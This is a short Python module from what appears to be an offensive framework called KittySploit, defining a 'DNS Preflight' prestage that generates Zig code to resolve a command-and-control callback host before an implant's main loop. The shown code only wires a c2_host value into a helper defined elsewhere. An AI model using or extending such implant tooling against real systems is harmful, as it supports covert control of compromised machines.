#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Any, Dict

from kittysploit import *
from lib.c2.prestage_guards_zig import Prestage_guards_zig


class Module(Prestage, Prestage_guards_zig):
    PRESTAGE_ID = "dns_preflight"

    __info__ = {
        "name": "DNS Preflight (Zig)",
        "description": "Resolve callback hostname before TCP preflight or main implant loop",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.MULTI,
        "languages": ["zig"],
        "prestage_dependencies": ["telemetry_buffer"],
        "tags": ["prestage", "offline", "network", "dns", "zig"],
    }

    def generate_zig(self, context: Dict[str, Any] = None) -> str:
        ctx = dict(context or {})
        c2_host = str(ctx.get("c2_host") or "").strip()
        return self.build_dns_preflight_zig(c2_host=c2_host)